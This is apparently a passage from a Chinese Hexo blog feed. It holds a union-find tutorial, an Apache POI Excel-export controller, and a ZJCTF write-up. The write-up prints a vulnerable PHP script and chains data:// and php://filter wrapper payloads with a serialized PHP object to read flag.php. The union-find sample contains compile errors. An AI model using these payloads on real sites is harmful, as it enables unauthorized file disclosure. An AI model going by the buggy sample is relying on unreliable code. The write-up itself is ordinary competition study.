class="line">某省调查城镇交通状况，得到现有城镇道路统计表，表中列出了每条道路直接连通的城镇。省政府“畅通工程”的目标是使全省任何两个城镇间都可以实现交通（但不一定有直接的道路相连，只要互相间接通过道路可达即可）。问最少还需要建设多少条道路？</span><br><span class="line"> </span><br><span class="line">Input</span><br><span class="line">测试输入包含若干测试用例。每个测试用例的第<span class="number">1</span>行给出两个正整数，分别是城镇数目N ( &lt; <span class="number">1000</span> )和道路数目M；随后的M行对应M条道路，每行给出一对正整数，分别是该条道路直接连通的两个城镇的编号。为简单起见，城镇从<span class="number">1</span>到N编号。</span><br><span class="line">注意:两个城市之间可以有多条道路相通,也就是说</span><br><span class="line"><span class="number">3</span> <span class="number">3</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="number">2</span> <span class="number">1</span></span><br><span class="line">这种输入也是合法的</span><br><span class="line">当N为<span class="number">0</span>时，输入结束，该用例不被处理。</span><br><span class="line"> </span><br><span class="line">Output</span><br><span class="line">对每个测试用例，在<span class="number">1</span>行里输出最少还需要建设的道路数目。</span><br><span class="line"> </span><br><span class="line">Sample Input</span><br><span class="line"><span class="number">4</span> <span class="number">2</span></span><br><span class="line"><span class="number">1</span> <span class="number">3</span></span><br><span class="line"><span class="number">4</span> <span class="number">3</span></span><br><span class="line"><span class="number">3</span> <span class="number">3</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="number">1</span> <span class="number">3</span></span><br><span class="line"><span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="number">5</span> <span class="number">2</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="number">3</span> <span class="number">5</span></span><br><span class="line"><span class="number">999</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"> </span><br><span class="line">Sample Output</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">998</span></span><br></pre></td></tr></table></figure><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>题意求一共有多少种不同集合，来判断要修几条路来使他们都相通？</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> f[<span class="number">1002</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> r=x;</span><br><span class="line">    <span class="keyword">while</span>(f[r]!=r)</span><br><span class="line">        r=f[r];</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fx,fy;</span><br><span class="line">    fx = findx(x);</span><br><span class="line">    fy = findx(y);</span><br><span class="line">    <span class="keyword">if</span>(fx != fy)</span><br><span class="line">        f[fx] = fy;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m,i,x,y,count;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n),n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">            f[i]=i;       <span class="comment">//初始化</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;m);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;x,&amp;y);</span><br><span class="line">            merge(x,y);</span><br><span class="line">        &#125;</span><br><span class="line">        count=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">find</span>(f[i)==i)</span><br><span class="line">                count ++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,count<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="路径压缩"><a href="#路径压缩" class="headerlink" title="路径压缩"></a>路径压缩</h3><p><b>递归方法</b></p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int find(int <span class="symbol">x</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="symbol">x</span>!=f[<span class="symbol">x</span>])&#123;</span><br><span class="line">        <span class="keyword">return</span> f[<span class="symbol">x</span>]=find(f[<span class="symbol">x</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f[<span class="symbol">x</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><b>父节点记录</b></p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int find(int <span class="symbol">x</span>)&#123;</span><br><span class="line">    int r=<span class="symbol">x</span>;</span><br><span class="line">    <span class="keyword">while</span>(f[<span class="symbol">x</span>]!=<span class="symbol">x</span>)&#123;</span><br><span class="line">        <span class="symbol">x</span>=f[<span class="symbol">x</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="symbol">x</span>!=r)&#123;   <span class="comment">//如果根节点不是原先的</span></span><br><span class="line">        int j=f[r]; <span class="comment">//把他父节点值记录下来</span></span><br><span class="line">        f[r]=<span class="symbol">x</span>;     <span class="comment">//把f[r]记录为根节点</span></span><br><span class="line">        r=j;        <span class="comment">//并且把r等于父节点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="symbol">x</span>; <span class="comment">//返回根节点值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有些地方如果表述不清莫怪。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring-boot中java-poi导出execl</title>
      <link href="/2019/12/13/java-poi%E5%AF%BC%E5%87%BAexecl/"/>
      <url>/2019/12/13/java-poi%E5%AF%BC%E5%87%BAexecl/</url>
      
        <content type="html"><![CDATA[<p><b>Apache POI</b> 是用Java编写的免费开源的跨平台的 Java API，Apache POI提供API给Java程式对Microsoft Office格式档案读和写的功能。</p><a id="more"></a><h2 id="Apache-POI"><a href="#Apache-POI" class="headerlink" title="Apache POI"></a>Apache POI</h2><p><b>Apache POI</b> 是创建和维护操作各种符合Office Open XML（OOXML）标准和微软的OLE 2复合文档格式（OLE2）的Java API。用它可以使用Java读取和创建,修改MS Excel文件.而且,还可以使用Java读取和创建MS Word和MSPowerPoint文件。</p><ul><li>HSSF － 提供读写Microsoft Excel XLS格式档案的功能。</li><li>XSSF － 提供读写Microsoft Excel OOXML XLSX格式档案的功能。</li><li>HWPF － 提供读写Microsoft Word DOC格式档案的功能。</li><li>HSLF － 提供读写Microsoft PowerPoint格式档案的功能。</li><li>HDGF － 提供读Microsoft Visio格式档案的功能。</li><li>HPBF － 提供读Microsoft Publisher格式档案的功能。</li><li>HSMF － 提供读Microsoft Outlook格式档案的功能。</li></ul><p>在POI中使用HSSF对象时，excel 2003最多只允许存储65536条数据，一般用来处理较少的数据量，这时对于百万级别数据，Excel肯定容纳不了，而且在计算机性能稍低的机器上测试，就很容易导致堆溢出。而当我升级到XSSF对象时，它可以直接支持excel2007以上版本，因为它采用ooxml格式。这时excel可以支持1048576条数据，单个sheet表就支持近104万条数据了,虽然这时导出100万数据能满足要求，但使用XSSF测试后发现偶尔还是会发生堆溢出，所以也不适合百万数据的导出。</p><h2 id="pom-xml依赖"><a href="#pom-xml依赖" class="headerlink" title="pom.xml依赖"></a>pom.xml依赖</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.poi<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>poi<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.14<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.poi<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>poi-ooxml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因为我有点懒，不太想写Service层。<br>这个项目没有Service层，所以我都写在了controller</p><h2 id="controller"><a href="#controller" class="headerlink" title="controller"></a>controller</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">package com.example.logSystem.controller;</span><br><span class="line"><span class="keyword">import</span> com.example.logSystem.mapper.LogMapper;</span><br><span class="line"><span class="keyword">import</span> com.example.logSystem.pojo.Log;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.hssf.usermodel.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 生成数据表</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">@RestController</span><br><span class="line">@RequestMapping(<span class="string">"/down"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Down</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    @Autowired</span><br><span class="line"><span class="comment">//    UserService userService;</span></span><br><span class="line">    LogMapper logMapper;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(<span class="string">"/export"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">Export</span><span class="params">(HttpServletResponse response,<span class="keyword">String</span> logdate,<span class="keyword">String</span> classroom)</span> throws IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        HSSFWorkbook workbook = <span class="keyword">new</span> HSSFWorkbook();                                 <span class="comment">// 创建一个Excel文件</span></span><br><span class="line">        HSSFSheet sheet = workbook.createSheet(<span class="string">"日志表"</span>);                <span class="comment">// 创建一个Excel的Sheet</span></span><br><span class="line"><span class="comment">//        List&lt;UserDetails&gt; classmateList = userService.getUserDetails();</span></span><br><span class="line">        sheet.setDefaultColumnWidth(<span class="number">12</span>);</span><br><span class="line">        System.out.<span class="built_in">println</span>(logdate+<span class="string">" "</span>+classroom);</span><br><span class="line">        List&lt;Log&gt; logList = logMapper.selectLog(logdate);                    <span class="comment">//查询语句</span></span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="string">"yes"</span>);</span><br><span class="line">        <span class="comment">// 设置要导出的文件的名字</span></span><br><span class="line">        <span class="keyword">String</span> fileName = <span class="string">"Log"</span>  + <span class="keyword">new</span> Date() + <span class="string">".xls"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 新增数据行，并且设置单元格数据</span></span><br><span class="line">        <span class="keyword">int</span> rowNum = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// headers表示excel表中第一行的表头 在excel表中添加表头</span></span><br><span class="line">        <span class="keyword">String</span>[] headers= &#123;<span class="string">"教师名字"</span>, <span class="string">"班级"</span>, <span class="string">"课程类型"</span>, <span class="string">"课程"</span> , <span class="string">"教室"</span> , <span class="string">"教室名称"</span> , <span class="string">"应到"</span> , <span class="string">"实到"</span> , <span class="string">"日期"</span> , <span class="string">"节次"</span> , <span class="string">"故障设备数"</span>,<span class="string">"备注"</span>&#125;;</span><br><span class="line">        HSSFRow row = sheet.createRow(<span class="number">0</span>);           <span class="comment">// 创建第一行</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;headers.length;i++)&#123;</span><br><span class="line">            HSSFCell cell = row.createCell(i);</span><br><span class="line">            HSSFRichTextString <span class="built_in">text</span> = <span class="keyword">new</span> HSSFRichTextString(headers[i]);</span><br><span class="line">            cell.setCellValue(<span class="built_in">text</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//在表中存放查询到的数据放入对应的列</span></span><br><span class="line">        <span class="keyword">for</span> (Log item : logList) &#123;</span><br><span class="line">            HSSFRow row1 = sheet.createRow(rowNum);</span><br><span class="line">            row1.createCell(<span class="number">0</span>).setCellValue(item.getTeachername());    <span class="comment">//教室名称</span></span><br><span class="line">            row1.createCell(<span class="number">1</span>).setCellValue(item.getClassname());</span><br><span class="line">            row1.createCell(<span class="number">2</span>).setCellValue(item.getCoursetype());</span><br><span class="line">            row1.createCell(<span class="number">3</span>).setCellValue(item.getCoursename());</span><br><span class="line">            row1.createCell(<span class="number">4</span>).setCellValue(item.getClassroom());</span><br><span class="line">            row1.createCell(<span class="number">5</span>).setCellValue(item.getClassroomname());</span><br><span class="line">            row1.createCell(<span class="number">6</span>).setCellValue(item.getFalsenumber());</span><br><span class="line">            row1.createCell(<span class="number">7</span>).setCellValue(item.getTruenumber());</span><br><span class="line">            row1.createCell(<span class="number">8</span>).setCellValue(item.getLogdate());</span><br><span class="line">            row1.createCell(<span class="number">9</span>).setCellValue(item.getSectionnumber());</span><br><span class="line">            row1.createCell(<span class="number">10</span>).setCellValue(item.getMachine());</span><br><span class="line">            row1.createCell(<span class="number">11</span>).setCellValue(item.getRemarks());</span><br><span class="line">            rowNum++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置响应的文件格式为excel,编码格式</span></span><br><span class="line">        response.setContentType(<span class="string">"application/vnd.ms-excel;charset=utf-8"</span>);</span><br><span class="line">        OutputStream os = response.getOutputStream();</span><br><span class="line"><span class="comment">//        response.setHeader("Content-disposition", "attachment;filename=" + fileName);</span></span><br><span class="line">        <span class="comment">//URLEncoder.encode(fileName,"UTF-8")能适配所有浏览器编码问题，具体的请查看源码</span></span><br><span class="line">        response.setHeader(<span class="string">"Content-Disposition"</span>, <span class="string">"attachment;filename="</span></span><br><span class="line">                + URLEncoder.encode(fileName,<span class="string">"UTF-8"</span>));</span><br><span class="line">        response.setCharacterEncoding(<span class="string">"utf-8"</span>);</span><br><span class="line">        workbook.<span class="built_in">write</span>(os);</span><br><span class="line">        os.<span class="built_in">flush</span>();</span><br><span class="line">        os.<span class="built_in">close</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"OK"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我的思路是在控制层写一个下载，当前端页面好了，对这这个接口进行post，页面接收到后就会生成一个execl来进行返回，其中数据是通过mybatis自动生成的查询框架来查询的。</p><p><img src="/1.jpg"></p><p>利用postman 发送请求</p><p><img src="/2.jpg"></p><h4 id="其中如果表头是中文的话可以在编译器中吧编码从gdk改为utf-8，否则string会导致乱码。"><a href="#其中如果表头是中文的话可以在编译器中吧编码从gdk改为utf-8，否则string会导致乱码。" class="headerlink" title="其中如果表头是中文的话可以在编译器中吧编码从gdk改为utf-8，否则string会导致乱码。"></a>其中如果表头是中文的话可以在编译器中吧编码从gdk改为utf-8，否则string会导致乱码。</h4><p>以上代码参考(感谢)：<br><a href="https://www.cnblogs.com/toutou/p/9857963.html#_label3" target="_blank" rel="noopener">请叫我头头哥</a></p>]]></content>
      
      
      <categories>
          
          <category> Spring-boot </category>
          
          <category> java-poi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019-ZJCTF</title>
      <link href="/2019/12/07/2019-ZJCTF/"/>
      <url>/2019/12/07/2019-ZJCTF/</url>
      
        <content type="html"><![CDATA[<p>浙江省大学生网络安全竞赛：逆转思路<br>这题当初没做出来，可惜了就拿个二等奖。<br>主要是php序列化，以及data协议。</p><a id="more"></a><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">"text"</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">"file"</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    echo <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        echo <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        include(<span class="variable">$file</span>);  <span class="regexp">//u</span>seless.php</span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        echo <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>file_get_contents() 函数把整个文件读入一个字符串中。</p><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p>利用data协议绕过,将welcome to the zjctf字符读入</p><p>data:&#x2F;&#x2F;协议允许读入</p><p>第一关payload：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">text</span>=data://text/plain<span class="comment">;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span></span><br></pre></td></tr></table></figure><p><img src="/1.jpg"></p><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>正则判断里面是否有flag字符，如果没有的话，并运行指定文件。</p><h3 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a>思路：</h3><p>利用filter来进行读取指定文件，因为提示有说useless.php</p><p>payload:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure><p>读取后进行base64解码</p><p><img src="/2.jpg"></p><p><img src="/3.jpg"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;  </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span></span><br><span class="line"><span class="php">        &#125;  </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><h3 id="思路：-2"><a href="#思路：-2" class="headerlink" title="思路："></a>思路：</h3><p>将flag调用，然后给里面file值为flag.php。<br>序列化后传入password，应该就会出flag。</p><p>以下是我自己写的php序列化</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $file=<span class="string">"flag.php"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $file = <span class="keyword">new</span> Flag();</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> serialize($file);</span></span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"Flag"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"file"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure><p>将三关payload综合起来：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="type">text</span>=data://<span class="type">text</span>/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;<span class="keyword">password</span>=O:<span class="number">4</span>:"Flag":<span class="number">1</span>:&#123;s:<span class="number">4</span>:"file";s:<span class="number">8</span>:"flag.php";&#125;</span><br></pre></td></tr></table></figure><p><img src="/4.jpg"></p><p>F12找到flag</p><p><img src="/5.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring-boot框架常用注解</title>
      <link href="/2019/12/07/Spring-boot%E5%B8%B8%E7%94%A8%E6%B3%A8%E8%A7%A3/"/>
      <url>/2019/12/07/Spring-boot%E5%B8%B8%E7%94%A8%E6%B3%A8%E8%A7%A3/</url>
      
